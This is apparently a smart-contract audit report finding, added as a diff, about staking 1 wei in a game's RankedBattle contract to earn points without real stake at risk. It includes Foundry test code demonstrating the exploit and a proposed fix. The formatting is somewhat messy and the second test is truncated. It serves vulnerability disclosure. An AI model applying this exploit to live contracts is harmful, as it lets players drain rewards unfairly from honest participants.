@@ -1,0 +1,140 @@
+### [H-1] Staking 1 wei in `RankedBattle::stakeNRN` is a risk-free guaranteed points accumulating vulnerability.
+
+**Description:** The `RankedBattle::stakeNRN` function enables a player to stake 1 wei , thus, the player is eligible to battle for points. Whenever he loses a battle , `stakeAtRisk` value is very close to zero, so that basically it is 0. The player can continue losing battles ,until he wins and get the accumulatedPoints reward ,which is ultimately ,as if he never lost a battle. Every additional win will accumulate points for the player based on the `EloFactor` and the `stakingFactor` which is 1.
+
+**Impact:** This vulnerability ,bypasses the stakeAtRisk system , making it possible for the player to never lose tokens,thus enabling only a win scenario.
+
+**Proof of Concept:**
+1.The player gets 1 or 2 fighters minted.
+2.The player stake 1 wei in the `RankedBattle::stakeNRN` function,which is enabling him to battle for points.
+3.I have intentionally lost 3 times in a row just to show the results ,which are basically the same.
+4.After the 3 losses , the player inevitably wins and receives 750 points when a portion is diverted to the merging pool, as if he never lost (if we do not count the EloFactor).
+
+<details>
+<summary>PoC</summary>
+Place the following test into `StakeAtRisk.t.sol`.
+
+ ```javascript
+ 
+ function testGetStakeAtRisk() public {
+        address player = vm.addr(3);
+        uint256 STAKE_AMOUNT = 0.000000000000000001 * 10 ** 18;
+        // uint256 STAKE_AMOUNT_3000 = 3_000 * 10 ** 18;
+        uint256 tokenId = 1;
+        // curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10 ** 4;
+        // player gets 2 fighters
+        _mintFromMergingPool(player); // tokenId - 0
+        _mintFromMergingPool(player); // tokenId - 1
+        // player gets NRN
+        _fundUserWith4kNeuronByTreasury(player);
+        vm.prank(player);
+        // player stakes NRN
+        _rankedBattleContract.stakeNRN(STAKE_AMOUNT, 1);
+        console.log("AmountStaked:", _rankedBattleContract.amountStaked(tokenId));
+        assertEq(_rankedBattleContract.amountStaked(1), STAKE_AMOUNT); // true
+
+        // player battles
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        // loses battle
+        _rankedBattleContract.updateBattleRecord(1, 50, 2, 1500, true);
+        uint256 curStakeAtRiskAfter1stLostBattle = (
+            10 * (_rankedBattleContract.amountStaked(tokenId) + _stakeAtRiskContract.getStakeAtRisk(tokenId))
+        ) / 10 ** 4;
+        uint256 amountStakedAfter1stLostBattle = _rankedBattleContract.amountStaked(tokenId);
+        uint256 stakeAtRiskAfter1stLostBattle = _stakeAtRiskContract.getStakeAtRisk(1);
+        console.log("StakeAtRiskAfterFirstLostBattle:", _stakeAtRiskContract.getStakeAtRisk(1));
+
+        console.log("AmountStakedAfterFirstLostBattle:", _rankedBattleContract.amountStaked(tokenId));
+
+        console.log("curStakeAtRiskAfterFirstLostBattle:", curStakeAtRiskAfter1stLostBattle);
+        assertEq(stakeAtRiskAfter1stLostBattle, 0);
+
+        // loses battle for 2nd time
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(1, 50, 2, 1500, true);
+        uint256 curStakeAtRiskAfter2ndLostBattle =
+            (10 * (amountStakedAfter1stLostBattle + stakeAtRiskAfter1stLostBattle)) / 10 ** 4;
+        console.log("curStakeAtRiskAfter2ndLostBattle:", curStakeAtRiskAfter2ndLostBattle);
+        uint256 stakeAtRiskAfter2ndLostBattleShouldBe = stakeAtRiskAfter1stLostBattle + curStakeAtRiskAfter2ndLostBattle;
+        console.log("AmountStakedAfter2ndLostBattle::", _rankedBattleContract.amountStaked(tokenId));
+
+        console.log("stakeAtRiskAfter2ndLostBattle:", _stakeAtRiskContract.getStakeAtRisk(1));
+        console.log("AmountToBeLost:", _stakeAtRiskContract.amountLost(player));
+        uint256 amountStakedAfter2ndLostBattleShouldBe =
+            amountStakedAfter1stLostBattle - curStakeAtRiskAfter2ndLostBattle;
+        assertEq(_rankedBattleContract.amountStaked(1), amountStakedAfter2ndLostBattleShouldBe);
+        assertEq(_stakeAtRiskContract.getStakeAtRisk(1), stakeAtRiskAfter2ndLostBattleShouldBe);
+
+        // loses battle for 3rd time
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(1, 50, 2, 1500, true);
+        uint256 curStakeAtRiskAfter3rdLostBattle =
+            (10 * (amountStakedAfter2ndLostBattleShouldBe + stakeAtRiskAfter2ndLostBattleShouldBe)) / 10 ** 4;
+        uint256 stakeAtRiskAfter3rdLostBattle = stakeAtRiskAfter2ndLostBattleShouldBe + curStakeAtRiskAfter3rdLostBattle;
+        uint256 amountStakedAfter3ndLostBattleShouldBe =
+            (amountStakedAfter2ndLostBattleShouldBe - curStakeAtRiskAfter3rdLostBattle) / 10 ** 18;
+        console.log("AmountStakedAfter3rdLostBattle::", amountStakedAfter3ndLostBattleShouldBe);
+        console.log("stakeAtRiskAfter3rdLostBattle:", stakeAtRiskAfter3rdLostBattle);
+        console.log("AmountToBeLostAfter3rdLostBattle:", _stakeAtRiskContract.amountLost(player));
+        assertEq(_stakeAtRiskContract.amountLost(player), 0);
+    }
+
+    function testPointsAfter3consecutiveLossesAnd2Wins() public {
+        uint256 tokenId = 1;
+        testGetStakeAtRisk();
+        // win battle for 1st time
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(1, 50, 0, 1500, true);
+        uint256 stakeAtRiskAfterTheWin = _stakeAtRiskContract.getStakeAtRisk(tokenId);
+        console.log("stakeAtRiskAfter3LossesAnd1Win:", _stakeAtRiskContract.getStakeAtRisk(tokenId));
+        console.log(
+            "AccumulatedPointsPerFigterAfter3LosesAnd1Win:",
+            _rankedBattleContract.accumulatedPointsPerFighter(tokenId, 0)
+        );
+        console.log("StakingFactorIs:", _rankedBattleContract._getStakingFactor(tokenId, stakeAtRiskAfterTheWin));
+        // The player has 750 points
+        assertEq(_rankedBattleContract.accumulatedPointsPerFighter(tokenId, 0), 750);
+
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(1, 50, 0, 1500, true);
+        uint256 stakeAtRiskAfter2Wins = _stakeAtRiskContract.getStakeAtRisk(tokenId);
+        console.log("stakeAtRiskAfter3LossesAnd2Win:", _stakeAtRiskContract.getStakeAtRisk(tokenId));
+        console.log(
+            "AccumulatedPointsPerFigterAfter3LosesAnd2Win:",
+            _rankedBattleContract.accumulatedPointsPerFighter(tokenId, 0)
+        );
+        console.log("StakingFactorIs:", _rankedBattleContract._getStakingFactor(tokenId, stakeAtRiskAfter2Wins));
+        // The player has 1500 points
+        assertEq(_rankedBattleContract.accumulatedPointsPerFighter(tokenId, 0), 1500);
+
+ ```
+</details>
+
+**Recommended Mitigation:** I will consider the staking amount to be bigger than 1e18, not allowing the users to stake a smaller unit than Ether.
+<javscript>
+
+```diff
+        function stakeNRN(uint256 amount, uint256 tokenId) external {
+-        require(amount > 0, "Amount cannot be 0");
++        require(amount > 1e18, "Amount cannot be 0");
+        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
+        require(_neuronInstance.balanceOf(msg.sender) >= amount, "Stake amount exceeds balance");
+        require(hasUnstaked[tokenId][roundId] == false, "Cannot add stake after unstaking this round");
+
+        _neuronInstance.approveStaker(msg.sender, address(this), amount);
+        bool success = _neuronInstance.transferFrom(msg.sender, address(this), amount);
+        if (success) {
+            if (amountStaked[tokenId] == 0) {
+                _fighterFarmInstance.updateFighterStaking(tokenId, true);
+            }
+            amountStaked[tokenId] += amount;
+            globalStakedAmount += amount;
+            stakingFactor[tokenId] = _getStakingFactor( // e math calculations
+            tokenId, _stakeAtRiskInstance.getStakeAtRisk(tokenId));
+            _calculatedStakingFactor[tokenId][roundId] = true;
+            emit Staked(msg.sender, amount);
+        }
+    }
+ 
+```
+</javascript>
